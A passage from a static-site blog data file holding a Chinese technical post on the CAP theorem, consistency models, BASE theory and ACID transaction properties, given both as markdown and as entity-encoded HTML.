**一致性：**在事务开始之前和事务结束以后，数据库的完整性没有被破坏。这表示写入的资料必须完全符合所有的预设规则，这包含资料的精确度、串联性以及后续数据库可以自发性地完成预定的工作。\n\n- **隔离性：**数据库允许多个并发事务同时对齐数据进行读写和修改的能力，隔离性可以防止多个事务并发执行时由于交叉执行而导致数据的不一致。事务隔离分为不同级别，包括读未提交（Read uncommitted）、读提交（read committed）、可重复读（repeatable read）和串行化（Serializable）。\n\n- **持久性：**事务处理结束后，对数据的修改就是永久的，即便系统故障也不会丢失。\n\nACID是传统数据库常用的设计理念, 追求强一致性模型。BASE支持的是大型分布式系统，提出通过牺牲强一致性获得高可用性。\n\n**ACID和BASE代表了两种截然相反的设计哲学，分处【一致性-可用性】分布图谱的两极。**\n\n","slug":"CAP原理、一致性模型、BASE理论和ACID特性","published":1,"updated":"2016-11-18T13:19:38.745Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciwbrulaa0007gwtmm3roawma","content":"<h3 id=\"CAP&#x539F;&#x7406;\"><a href=\"#CAP&#x539F;&#x7406;\" class=\"headerlink\" title=\"CAP&#x539F;&#x7406;\"></a>CAP&#x539F;&#x7406;</h3><p>&#x5728;&#x7406;&#x8BBA;&#x8BA1;&#x7B97;&#x673A;&#x79D1;&#x5B66;&#x4E2D;&#xFF0C;CAP&#x5B9A;&#x7406;&#xFF08;CAP theorem&#xFF09;&#xFF0C;&#x53C8;&#x88AB;&#x79F0;&#x4F5C;&#x5E03;&#x9C81;&#x5C14;&#x5B9A;&#x7406;&#xFF08;Brewer&#x2019;s theorem&#xFF09;&#xFF0C;&#x5B83;&#x6307;&#x51FA;&#x5BF9;&#x4E8E;&#x4E00;&#x4E2A;&#x5206;&#x5E03;&#x5F0F;&#x8BA1;&#x7B97;&#x7CFB;&#x7EDF;&#x6765;&#x8BF4;&#xFF0C;&#x4E0D;&#x53EF;&#x80FD;&#x540C;&#x65F6;&#x6EE1;&#x8DB3;&#x4EE5;&#x4E0B;&#x4E09;&#x70B9;&#xFF1A;</p>\n<ul>\n<li><p><strong>&#x4E00;&#x81F4;&#x6027;&#xFF08;Consistence&#xFF09;</strong><br>&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#x5907;&#x4EFD;&#xFF0C;&#x5728;&#x540C;&#x4E00;&#x65F6;&#x523B;&#x662F;&#x5426;&#x540C;&#x6837;&#x7684;&#x503C;&#x3002;&#xFF08;&#x7B49;&#x540C;&#x4E8E;&#x6240;&#x6709;&#x8282;&#x70B9;&#x8BBF;&#x95EE;&#x540C;&#x4E00;&#x4EFD;&#x6700;&#x65B0;&#x7684;&#x6570;&#x636E;&#x526F;&#x672C;&#xFF09;</p>\n</li>\n<li><p><strong>&#x53EF;&#x7528;&#x6027;&#xFF08;Availability&#xFF09;</strong><br>&#x96C6;&#x7FA4;&#x51FA;&#x73B0;&#x6545;&#x969C;&#x8282;&#x70B9;&#x540E;&#xFF0C;&#x662F;&#x5426;&#x8FD8;&#x80FD;&#x54CD;&#x5E94;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8BFB;&#x5199;&#x8BF7;&#x6C42;&#x3002;&#xFF08;&#x5BF9;&#x6570;&#x636E;&#x66F4;&#x65B0;&#x5177;&#x5907;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#xFF09;</p>\n</li>\n<li><p><strong>&#x5206;&#x533A;&#x5BB9;&#x5FCD;&#x6027;&#xFF08;Partition tolerance&#xFF09;</strong><br>&#x5B9E;&#x9645;&#x4E2D;&#x901A;&#x4FE1;&#x4EA7;&#x751F;&#x5EF6;&#x65F6;&#x3002;&#x7CFB;&#x7EDF;&#x5982;&#x679C;&#x4E0D;&#x80FD;&#x5728;&#x65F6;&#x9650;&#x5185;&#x8FBE;&#x6210;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x5C31;&#x610F;&#x5473;&#x7740;&#x53D1;&#x751F;&#x4E86;&#x5206;&#x533A;&#x7684;&#x60C5;&#x51B5;&#xFF0C;&#x5FC5;&#x987B;&#x5C31;&#x5F53;&#x524D;&#x64CD;&#x4F5C;&#x5728;C&#x70B9;&#x548C;A&#x70B9;&#x4E4B;&#x95F4;&#x505A;&#x51FA;&#x9009;&#x62E9;&#x3002;</p>\n</li>\n</ul>\n<p>CAP&#x539F;&#x7406;&#x6307;&#x7684;&#x662F;&#xFF0C;CAP&#x7684;&#x4E09;&#x4E2A;&#x8981;&#x7D20;&#x6700;&#x591A;&#x53EA;&#x80FD;&#x540C;&#x65F6;&#x5B9E;&#x73B0;&#x4E24;&#x70B9;&#xFF0C;&#x4E0D;&#x53EF;&#x80FD;&#x4E09;&#x8005;&#x517C;&#x987E;&#x3002;&#x56E0;&#x6B64;&#x5728;&#x8FDB;&#x884C;&#x5206;&#x5E03;&#x5F0F;&#x67B6;&#x6784;&#x8BBE;&#x8BA1;&#x65F6;&#xFF0C;&#x5FC5;&#x987B;&#x505A;&#x51FA;&#x53D6;&#x820D;&#x3002;&#x800C;&#x5BF9;&#x4E8E;&#x5206;&#x5E03;&#x5F0F;&#x6570;&#x636E;&#x7CFB;&#x7EDF;&#xFF0C;&#x5206;&#x533A;&#x5BB9;&#x5FCD;&#x6027;&#x662F;&#x57FA;&#x672C;&#x8981;&#x6C42;&#xFF0C;&#x5426;&#x5219;&#x5C31;&#x5931;&#x53BB;&#x4E86;&#x4EF7;&#x503C;&#x3002;</p>\n<p>&#x56E0;&#x6B64;&#x8BBE;&#x8BA1;&#x5206;&#x5E03;&#x5F0F;&#x6570;&#x636E;&#x7CFB;&#x7EDF;&#xFF0C;&#x5C31;&#x662F;&#x5728;&#x4E00;&#x81F4;&#x6027;&#x548C;&#x53EF;&#x7528;&#x6027;&#x4E4B;&#x95F4;&#x53D6;&#x4E00;&#x4E2A;&#x5E73;&#x8861;&#x3002;<strong>&#x5BF9;&#x4E8E;&#x5927;&#x591A;&#x6570;web&#x5E94;&#x7528;&#xFF0C;&#x5176;&#x5B9E;&#x5E76;&#x4E0D;&#x9700;&#x8981;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x56E0;&#x6B64;&#x727A;&#x7272;&#x4E00;&#x81F4;&#x6027;&#x800C;&#x6362;&#x53D6;&#x9AD8;&#x53EF;&#x7528;&#x6027;&#xFF0C;&#x662F;&#x76EE;&#x524D;&#x591A;&#x6570;&#x5206;&#x5E03;&#x5F0F;&#x6570;&#x636E;&#x5E93;&#x4EA7;&#x54C1;&#x7684;&#x65B9;&#x5411;&#x3002;</strong></p>\n<a id=\"more\"></a>\n<p>&#x5F53;&#x7136;&#xFF0C;&#x5E76;&#x4E0D;&#x662F;&#x5B8C;&#x5168;&#x4E0D;&#x7BA1;&#x6570;&#x636E;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x3002;&#x727A;&#x7272;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x53EA;&#x662F;&#x4E0D;&#x518D;&#x8981;&#x6C42;&#x5173;&#x7CFB;&#x578B;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x800C;&#x662F;&#x53EA;&#x8981;&#x7CFB;&#x7EDF;&#x80FD;&#x8FBE;&#x5230;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x5373;&#x53EF;&#xFF0C;&#x8003;&#x8651;&#x5230;&#x5BA2;&#x6237;&#x4F53;&#x9A8C;&#xFF0C;&#x8FD9;&#x4E2A;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x7684;&#x65F6;&#x95F4;&#x7A97;&#x53E3;&#xFF0C;&#x8981;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x5BF9;&#x7528;&#x6237;&#x900F;&#x660E;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x9700;&#x8981;&#x4FDD;&#x969C;&#x201C;&#x7528;&#x6237;&#x611F;&#x77E5;&#x5230;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x201D;&#x3002;&#x901A;&#x5E38;&#x662F;&#x901A;&#x8FC7;&#x6570;&#x636E;&#x7684;&#x591A;&#x4EFD;&#x5F02;&#x6B65;&#x590D;&#x5236;&#x6765;&#x5B9E;&#x73B0;&#x7CFB;&#x7EDF;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#x548C;&#x6570;&#x636E;&#x7684;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x7684;&#xFF0C;&#x201C;&#x7528;&#x6237;&#x611F;&#x77E5;&#x5230;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x201D;&#x7684;&#x65F6;&#x95F4;&#x7A97;&#x53E3;&#x5219;&#x53D6;&#x51B3;&#x4E8E;&#x6570;&#x636E;&#x590D;&#x5236;&#x5230;&#x4E00;&#x81F4;&#x72B6;&#x6001;&#x7684;&#x65F6;&#x95F4;&#x3002;</p>\n<hr>\n<h3 id=\"&#x4E00;&#x81F4;&#x6027;&#x6A21;&#x578B;\"><a href=\"#&#x4E00;&#x81F4;&#x6027;&#x6A21;&#x578B;\" class=\"headerlink\" title=\"&#x4E00;&#x81F4;&#x6027;&#x6A21;&#x578B;\"></a>&#x4E00;&#x81F4;&#x6027;&#x6A21;&#x578B;</h3><h4 id=\"&#x5F3A;&#x4E00;&#x81F4;&#x6027;\"><a href=\"#&#x5F3A;&#x4E00;&#x81F4;&#x6027;\" class=\"headerlink\" title=\"&#x5F3A;&#x4E00;&#x81F4;&#x6027;\"></a>&#x5F3A;&#x4E00;&#x81F4;&#x6027;</h4><p>&#x5F53;&#x66F4;&#x65B0;&#x64CD;&#x4F5C;&#x5B8C;&#x6210;&#x4E4B;&#x540E;&#xFF0C;&#x4EFB;&#x4F55;&#x591A;&#x4E2A;&#x540E;&#x7EED;&#x8FDB;&#x7A0B;&#x6216;&#x8005;&#x7EBF;&#x7A0B;&#x7684;&#x8BBF;&#x95EE;&#x90FD;&#x4F1A;&#x8FD4;&#x56DE;&#x6700;&#x65B0;&#x7684;&#x66F4;&#x65B0;&#x8FC7;&#x7684;&#x503C;&#x3002;&#x8FD9;&#x79CD;&#x662F;&#x5BF9;&#x7528;&#x6237;&#x6700;&#x53CB;&#x597D;&#x7684;&#xFF0C;&#x5C31;&#x662F;&#x7528;&#x6237;&#x4E0A;&#x4E00;&#x6B21;&#x5199;&#x4EC0;&#x4E48;&#xFF0C;&#x4E0B;&#x4E00;&#x6B21;&#x5C31;&#x4FDD;&#x8BC1;&#x80FD;&#x8BFB;&#x5230;&#x4EC0;&#x4E48;&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x79CD;&#x5B9E;&#x73B0;&#x5BF9;&#x6027;&#x80FD;&#x5F71;&#x54CD;&#x8F83;&#x5927;&#x3002;</p>\n<h4 id=\"&#x5F31;&#x4E00;&#x81F4;&#x6027;\"><a href=\"#&#x5F31;&#x4E00;&#x81F4;&#x6027;\" class=\"headerlink\" title=\"&#x5F31;&#x4E00;&#x81F4;&#x6027;\"></a>&#x5F31;&#x4E00;&#x81F4;&#x6027;</h4><p>&#x7CFB;&#x7EDF;&#x5E76;&#x4E0D;&#x4FDD;&#x8BC1;&#x7EED;&#x8FDB;&#x7A0B;&#x6216;&#x8005;&#x7EBF;&#x7A0B;&#x7684;&#x8BBF;&#x95EE;&#x90FD;&#x4F1A;&#x8FD4;&#x56DE;&#x6700;&#x65B0;&#x7684;&#x66F4;&#x65B0;&#x8FC7;&#x7684;&#x503C;&#x3002;&#x7CFB;&#x7EDF;&#x5728;&#x6570;&#x636E;&#x5199;&#x5165;&#x6210;&#x529F;&#x4E4B;&#x540E;&#xFF0C;&#x4E0D;&#x627F;&#x8BFA;&#x7ACB;&#x5373;&#x53EF;&#x4EE5;&#x8BFB;&#x5230;&#x6700;&#x65B0;&#x5199;&#x5165;&#x7684;&#x503C;&#xFF0C;&#x4E5F;&#x4E0D;&#x4F1A;&#x5177;&#x4F53;&#x7684;&#x627F;&#x8BFA;&#x591A;&#x4E45;&#x4E4B;&#x540E;&#x53EF;&#x4EE5;&#x8BFB;&#x5230;&#x3002;&#x4F46;&#x4F1A;&#x5C3D;&#x53EF;&#x80FD;&#x4FDD;&#x8BC1;&#x5728;&#x67D0;&#x4E2A;&#x65F6;&#x95F4;&#x7EA7;&#x522B;&#xFF08;&#x6BD4;&#x5982;&#x79D2;&#x7EA7;&#x522B;&#xFF09;&#x4E4B;&#x540E;&#xFF0C;&#x53EF;&#x4EE5;&#x8BA9;&#x6570;&#x636E;&#x8FBE;&#x5230;&#x4E00;&#x81F4;&#x6027;&#x72B6;&#x6001;&#x3002;</p>\n<h4 id=\"&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;\"><a href=\"#&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;\" class=\"headerlink\" title=\"&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;\"></a>&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;</h4><p>&#x5F31;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x7279;&#x5B9A;&#x5F62;&#x5F0F;&#x3002;&#x7CFB;&#x7EDF;&#x4FDD;&#x8BC1;&#x5728;&#x6CA1;&#x6709;&#x540E;&#x7EED;&#x66F4;&#x65B0;&#x7684;&#x524D;&#x63D0;&#x4E0B;&#xFF0C;&#x7CFB;&#x7EDF;&#x6700;&#x7EC8;&#x8FD4;&#x56DE;&#x4E0A;&#x4E00;&#x6B21;&#x66F4;&#x65B0;&#x64CD;&#x4F5C;&#x7684;&#x503C;&#x3002;&#x5728;&#x6CA1;&#x6709;&#x6545;&#x969C;&#x53D1;&#x751F;&#x7684;&#x524D;&#x63D0;&#x4E0B;&#xFF0C;&#x4E0D;&#x4E00;&#x81F4;&#x7A97;&#x53E3;&#x7684;&#x65F6;&#x95F4;&#x4E3B;&#x8981;&#x53D7;&#x901A;&#x4FE1;&#x5EF6;&#x8FDF;&#xFF0C;&#x7CFB;&#x7EDF;&#x8D1F;&#x8F7D;&#x548C;&#x590D;&#x5236;&#x526F;&#x672C;&#x7684;&#x4E2A;&#x6570;&#x5F71;&#x54CD;&#x3002;DNS&#x662F;&#x4E00;&#x4E2A;&#x5178;&#x578B;&#x7684;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x7CFB;&#x7EDF;&#x3002;</p>\n<h4 id=\"&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x6A21;&#x578B;&#x7684;&#x53D8;&#x79CD;\"><a href=\"#&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x6A21;&#x578B;&#x7684;&#x53D8;&#x79CD;\" class=\"headerlink\" title=\"&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x6A21;&#x578B;&#x7684;&#x53D8;&#x79CD;\"></a>&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x6A21;&#x578B;&#x7684;&#x53D8;&#x79CD;</h4><ul>\n<li><strong>&#x56E0;&#x679C;&#x4E00;&#x81F4;&#x6027;&#xFF1A;</strong>&#x5982;&#x679C;A&#x8FDB;&#x7A0B;&#x5728;&#x66F4;&#x65B0;&#x4E4B;&#x540E;&#x5411;B&#x8FDB;&#x7A0B;&#x901A;&#x77E5;&#x66F4;&#x65B0;&#x7684;&#x5B8C;&#x6210;&#xFF0C;&#x90A3;&#x4E48;B&#x7684;&#x8BBF;&#x95EE;&#x64CD;&#x4F5C;&#x5C06;&#x4F1A;&#x8FD4;&#x56DE;&#x66F4;&#x65B0;&#x7684;&#x503C;&#x3002;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x56E0;&#x679C;&#x5173;&#x7CFB;&#x7684;C&#x8FDB;&#x7A0B;&#x5C06;&#x4F1A;&#x9075;&#x5FAA;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x89C4;&#x5219;&#x3002;</li>\n<li>&#x8BFB;&#x5DF1;&#x6240;&#x5199;&#x4E00;&#x81F4;&#x6027;&#xFF1A;&#x56E0;&#x679C;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x7279;&#x5B9A;&#x5F62;&#x5F0F;&#x3002;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x603B;&#x53EF;&#x4EE5;&#x8BFB;&#x5230;&#x81EA;&#x5DF1;&#x66F4;&#x65B0;&#x7684;&#x6570;&#x636E;&#x3002;</li>\n<li><strong>&#x4F1A;&#x8BDD;&#x4E00;&#x81F4;&#x6027;&#xFF1A;</strong>&#x8BFB;&#x5DF1;&#x6240;&#x5199;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x7279;&#x5B9A;&#x5F62;&#x5F0F;&#x3002;&#x8FDB;&#x7A0B;&#x5728;&#x8BBF;&#x95EE;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#x540C;&#x4E00;&#x4E2A;&#x4F1A;&#x8BDD;&#x5185;&#xFF0C;&#x7CFB;&#x7EDF;&#x4FDD;&#x8BC1;&#x8BE5;&#x8FDB;&#x7A0B;&#x8BFB;&#x5DF1;&#x4E4B;&#x6240;&#x5199;&#x3002;</li>\n<li><strong>&#x5355;&#x8C03;&#x8BFB;&#x4E00;&#x81F4;&#x6027;&#xFF1A;</strong>&#x5982;&#x679C;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x5DF2;&#x7ECF;&#x8BFB;&#x53D6;&#x5230;&#x4E00;&#x4E2A;&#x7279;&#x5B9A;&#x503C;&#xFF0C;&#x90A3;&#x4E48;&#x8BE5;&#x8FDB;&#x7A0B;&#x4E0D;&#x4F1A;&#x8BFB;&#x53D6;&#x5230;&#x8BE5;&#x503C;&#x4EE5;&#x524D;&#x7684;&#x4EFB;&#x4F55;&#x503C;&#x3002;</li>\n<li><strong>&#x5355;&#x8C03;&#x5199;&#x4E00;&#x81F4;&#x6027;&#xFF1A;</strong>&#x7CFB;&#x7EDF;&#x4FDD;&#x8BC1;&#x5BF9;&#x540C;&#x4E00;&#x4E2A;&#x8FDB;&#x7A0B;&#x7684;&#x5199;&#x64CD;&#x4F5C;&#x4E32;&#x884C;&#x5316;&#x3002;</li>\n</ul>\n<p>&#x4E0A;&#x8FF0;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x4E0D;&#x540C;&#x65B9;&#x5F0F;&#x53EF;&#x4EE5;&#x8FDB;&#x884C;&#x7EC4;&#x5408;&#xFF0C;&#x4F8B;&#x5982;&#x5355;&#x8C03;&#x8BFB;&#x4E00;&#x81F4;&#x6027;&#x548C;&#x8BFB;&#x5DF1;&#x4E4B;&#x6240;&#x5199;&#x4E00;&#x81F4;&#x6027;&#x5C31;&#x53EF;&#x4EE5;&#x7EC4;&#x5408;&#x5B9E;&#x73B0;&#x3002;&#x5E76;&#x4E14;&#x4ECE;&#x5B9E;&#x8DF5;&#x7684;&#x89D2;&#x5EA6;&#x6765;&#x770B;&#xFF0C;&#x8FD9;&#x4E24;&#x8005;&#x7684;&#x7EC4;&#x5408;&#xFF0C;&#x8BFB;&#x53D6;&#x81EA;&#x5DF1;&#x66F4;&#x65B0;&#x7684; &#x6570;&#x636E;&#xFF0C;&#x548C;&#x4E00;&#x65E6;&#x8BFB;&#x53D6;&#x5230;&#x6700;&#x65B0;&#x7684;&#x7248;&#x672C;&#x4E0D;&#x4F1A;&#x518D;&#x8BFB;&#x53D6;&#x65E7;&#x7248;&#x672C;&#xFF0C;&#x5BF9;&#x4E8E;&#x6B64;&#x67B6;&#x6784;&#x4E0A;&#x7684;&#x7A0B;&#x5E8F;&#x5F00;&#x53D1;&#x6765;&#x8BF4;&#xFF0C;&#x4F1A;&#x5C11;&#x5F88;&#x591A;&#x989D;&#x5916;&#x7684;&#x70E6;&#x607C;&#x3002;</p>\n<hr>\n<h3 id=\"BASE&#x7406;&#x8BBA;&#x2014;&#x2014;CAP&#x7406;&#x8BBA;&#x7684;&#x5EF6;&#x4F38;\"><a href=\"#BASE&#x7406;&#x8BBA;&#x2014;&#x2014;CAP&#x7406;&#x8BBA;&#x7684;&#x5EF6;&#x4F38;\" class=\"headerlink\" title=\"BASE&#x7406;&#x8BBA;&#x2014;&#x2014;CAP&#x7406;&#x8BBA;&#x7684;&#x5EF6;&#x4F38;\"></a>BASE&#x7406;&#x8BBA;&#x2014;&#x2014;CAP&#x7406;&#x8BBA;&#x7684;&#x5EF6;&#x4F38;</h3><p><strong><em>BASE&#x7406;&#x8BBA;&#x662F;&#x5BF9;CAP&#x7406;&#x8BBA;&#x7684;&#x5EF6;&#x4F38;</em></strong>&#xFF0C;&#x6838;&#x5FC3;&#x601D;&#x60F3;&#x662F;&#x5373;&#x4F7F;&#x65E0;&#x6CD5;&#x505A;&#x5230;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#xFF08;Strong Consistency&#xFF0C;CAP&#x7684;&#x4E00;&#x81F4;&#x6027;&#x5C31;&#x662F;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#xFF09;&#xFF0C;&#x4F46;&#x5E94;&#x7528;&#x53EF;&#x4EE5;&#x91C7;&#x7528;&#x9002;&#x5408;&#x7684;&#x65B9;&#x5F0F;&#x8FBE;&#x5230;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#xFF08;Eventual Consitency&#xFF09;&#x3002;<strong>Redis&#x7B49;&#x4F17;&#x591A;&#x7CFB;&#x7EDF;&#x6784;&#x5EFA;&#x4E8E;&#x8FD9;&#x4E2A;&#x7406;&#x8BBA;&#x4E4B;&#x4E0A;&#x3002;</strong></p>\n<ul>\n<li><p><strong>&#x57FA;&#x672C;&#x53EF;&#x7528;&#xFF08;Basically Available&#xFF09;</strong><br>&#x57FA;&#x672C;&#x53EF;&#x7528;&#x662F;&#x6307;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x5728;&#x51FA;&#x73B0;&#x6545;&#x969C;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5141;&#x8BB8;&#x635F;&#x5931;&#x90E8;&#x5206;&#x53EF;&#x7528;&#x6027;&#xFF0C;&#x5373;&#x4FDD;&#x8BC1;&#x6838;&#x5FC3;&#x53EF;&#x7528;&#x3002;<br>&#x7535;&#x5546;&#x5927;&#x4FC3;&#x65F6;&#xFF0C;&#x4E3A;&#x4E86;&#x5E94;&#x5BF9;&#x8BBF;&#x95EE;&#x91CF;&#x6FC0;&#x589E;&#xFF0C;&#x90E8;&#x5206;&#x7528;&#x6237;&#x53EF;&#x80FD;&#x4F1A;&#x88AB;&#x5F15;&#x5BFC;&#x5230;&#x964D;&#x7EA7;&#x9875;&#x9762;&#xFF0C;&#x670D;&#x52A1;&#x5C42;&#x4E5F;&#x53EF;&#x80FD;&#x53EA;&#x63D0;&#x4F9B;&#x964D;&#x7EA7;&#x670D;&#x52A1;&#x3002;&#x8FD9;&#x5C31;&#x662F;&#x635F;&#x5931;&#x90E8;&#x5206;&#x53EF;&#x7528;&#x6027;&#x7684;&#x4F53;&#x73B0;&#x3002;</p>\n</li>\n<li><p><strong>&#x8F6F;&#x72B6;&#x6001;&#xFF08; Soft State&#xFF09;</strong><br>&#x8F6F;&#x72B6;&#x6001;&#x662F;&#x6307;&#x5141;&#x8BB8;&#x7CFB;&#x7EDF;&#x5B58;&#x5728;&#x4E2D;&#x95F4;&#x72B6;&#x6001;&#xFF0C;&#x800C;&#x8BE5;&#x4E2D;&#x95F4;&#x72B6;&#x6001;&#x4E0D;&#x4F1A;&#x5F71;&#x54CD;&#x7CFB;&#x7EDF;&#x6574;&#x4F53;&#x53EF;&#x7528;&#x6027;&#x3002;&#x5206;&#x5E03;&#x5F0F;&#x5B58;&#x50A8;&#x4E2D;&#x4E00;&#x822C;&#x4E00;&#x4EFD;&#x6570;&#x636E;&#x81F3;&#x5C11;&#x4F1A;&#x6709;&#x4E09;&#x4E2A;&#x526F;&#x672C;&#xFF0C;&#x5141;&#x8BB8;&#x4E0D;&#x540C;&#x8282;&#x70B9;&#x95F4;&#x526F;&#x672C;&#x540C;&#x6B65;&#x7684;&#x5EF6;&#x65F6;&#x5C31;&#x662F;&#x8F6F;&#x72B6;&#x6001;&#x7684;&#x4F53;&#x73B0;&#x3002;mysql replication&#x7684;&#x5F02;&#x6B65;&#x590D;&#x5236;&#x4E5F;&#x662F;&#x4E00;&#x79CD;&#x4F53;&#x73B0;&#x3002;</p>\n</li>\n<li><p><strong>&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#xFF08; Eventual Consistency&#xFF09;</strong><br>&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x662F;&#x6307;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#x526F;&#x672C;&#x7ECF;&#x8FC7;&#x4E00;&#x5B9A;&#x65F6;&#x95F4;&#x540E;&#xFF0C;&#x6700;&#x7EC8;&#x80FD;&#x591F;&#x8FBE;&#x5230;&#x4E00;&#x81F4;&#x7684;&#x72B6;&#x6001;&#x3002;&#x5F31;&#x4E00;&#x81F4;&#x6027;&#x548C;&#x5F3A;&#x4E00;&#x81F4;&#x6027;&#x76F8;&#x53CD;&#xFF0C;&#x6700;&#x7EC8;&#x4E00;&#x81F4;&#x6027;&#x662F;&#x5F31;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x4E00;&#x79CD;&#x7279;&#x6B8A;&#x60C5;&#x51B5;&#x3002;</p>\n</li>\n</ul>\n<hr>\n<h3 id=\"BASE&#x548C;ACID&#x7684;&#x533A;&#x522B;&#x4E0E;&#x8054;&#x7CFB;\"><a href=\"#BASE&#x548C;ACID&#x7684;&#x533A;&#x522B;&#x4E0E;&#x8054;&#x7CFB;\" class=\"headerlink\" title=\"BASE&#x548C;ACID&#x7684;&#x533A;&#x522B;&#x4E0E;&#x8054;&#x7CFB;\"></a>BASE&#x548C;ACID&#x7684;&#x533A;&#x522B;&#x4E0E;&#x8054;&#x7CFB;</h3><p>ACID&#xFF0C;&#x662F;&#x6307;&#x6570;&#x636E;&#x5E93;&#x7BA1;&#x7406;&#x7CFB;&#x7EDF;&#xFF08;DBMS&#xFF09;&#x5728;&#x5199;&#x5165;/&#x66F4;&#x65B0;&#x8D44;&#x6599;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x4E3A;&#x4FDD;&#x8BC1;&#x4E8B;&#x52A1;&#xFF08;transaction&#xFF09;&#x662F;&#x6B63;&#x786E;&#x53EF;&#x9760;&#x7684;&#xFF0C;&#x6240;&#x5FC5;&#x987B;&#x5177;&#x5907;&#x7684;&#x56DB;&#x4E2A;&#x7279;&#x6027;&#xFF1A;&#x539F;&#x5B50;&#x6027;&#xFF08;atomicity&#xFF0C;&#x6216;&#x79F0;&#x4E0D;&#x53EF;&#x5206;&#x5272;&#x6027;&#xFF09;&#x3001;&#x4E00;&#x81F4;&#x6027;&#xFF08;consistency&#xFF09;&#x3001;&#x9694;&#x79BB;&#x6027;&#xFF08;isolation&#xFF0C;&#x53C8;&#x79F0;&#x72EC;&#x7ACB;&#x6027;&#xFF09;&#x3001;&#x6301;&#x4E45;&#x6027;&#xFF08;durability&#xFF09;&#x3002;</p>\n<ul>\n<li><p><strong>&#x539F;&#x5B50;&#x6027;&#xFF1A;</strong>&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#xFF08;transaction&#xFF09;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x64CD;&#x4F5C;&#xFF0C;&#x8981;&#x4E48;&#x5168;&#x90E8;&#x5B8C;&#x6210;&#xFF0C;&#x8981;&#x4E48;&#x5168;&#x90E8;&#x4E0D;&#x5B8C;&#x6210;&#xFF0C;&#x4E0D;&#x4F1A;&#x7ED3;&#x675F;&#x5728;&#x4E2D;&#x95F4;&#x67D0;&#x4E2A;&#x73AF;&#x8282;&#x3002;&#x4E8B;&#x52A1;&#x5728;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x53D1;&#x751F;&#x9519;&#x8BEF;&#xFF0C;&#x4F1A;&#x88AB;&#x56DE;&#x6EDA;&#xFF08;Rollback&#xFF09;&#x5230;&#x4E8B;&#x52A1;&#x5F00;&#x59CB;&#x524D;&#x7684;&#x72B6;&#x6001;&#xFF0C;&#x5C31;&#x50CF;&#x8FD9;&#x4E2A;&#x4E8B;&#x52A1;&#x4ECE;&#x6765;&#x6CA1;&#x6709;&#x6267;&#x884C;&#x8FC7;&#x4E00;&#x6837;&#x3002;</p>\n</li>\n<li><p><strong>&#x4E00;&#x81F4;&#x6027;&#xFF1A;</strong>&#x5728;&#x4E8B;&#x52A1;&#x5F00;&#x59CB;&#x4E4B;&#x524D;&#x548C;&#x4E8B;&#x52A1;&#x7ED3;&#x675F;&#x4EE5;&#x540E;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x5B8C;&#x6574;&#x6027;&#x6CA1;&#x6709;&#x88AB;&#x7834;&#x574F;&#x3002;&#x8FD9;&#x8868;&#x793A;&#x5199;&#x5165;&#x7684;&#x8D44;&#x6599;&#x5FC5;&#x987B;&#x5B8C;&#x5168;&#x7B26;&#x5408;&#x6240;&#x6709;&#x7684;&#x9884;&#x8BBE;&#x89C4;&#x5219;&#xFF0C;&#x8FD9;&#x5305;&#x542B;&#x8D44;&#x6599;&#x7684;&#x7CBE;&#x786E;&#x5EA6;&#x3001;&#x4E32;&#x8054;&#x6027;&#x4EE5;&#x53CA;&#x540E;&#x7EED;&#x6570;&#x636E;&#x5E93;&#x53EF;&#x4EE5;&#x81EA;&#x53D1;&